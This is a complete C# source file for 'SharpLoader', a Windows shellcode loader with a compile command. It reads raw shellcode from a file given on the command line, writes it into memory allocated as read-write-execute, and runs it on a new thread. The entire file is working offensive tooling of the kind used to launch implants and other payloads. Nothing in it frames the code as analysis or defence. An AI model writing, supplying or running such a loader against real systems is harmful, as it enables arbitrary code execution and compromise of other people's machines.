//To compile with VS Command Prompt: csc /out:SharpLoader.exe /debug:full source.cs

using System;
using System.IO;
using System.Runtime.InteropServices;

class SharpLoader
{
    // Import necessary Windows API functions
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    // Memory allocation constants
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main(string[] args)
    {
        if (args.Length != 1)
        {
            Console.WriteLine("Usage: SharpLoader.exe <path_to_bin_file>");
            return;
        }

        // Read the shellcode from file
        byte[] shellcode;
        try
        {
            shellcode = File.ReadAllBytes(args[0]);
        }
        catch (IOException)
        {
            Console.WriteLine("Error: Could not read the file.");
            return;
        }

        // Allocate memory for the shellcode
        IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (funcAddr == IntPtr.Zero)
        {
            Console.WriteLine("Error: Memory allocation failed.");
            return;
        }

        // Copy the shellcode to the allocated memory
        Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);

        // Create a thread to run the shellcode
        uint threadId;
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, out threadId);
        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("Error: Could not create thread.");
            return;
        }

        // Wait for the shellcode to finish executing
        WaitForSingleObject(hThread, 0xFFFFFFFF); // INFINITE
        Console.WriteLine("Shellcode executed successfully.");
    }
}
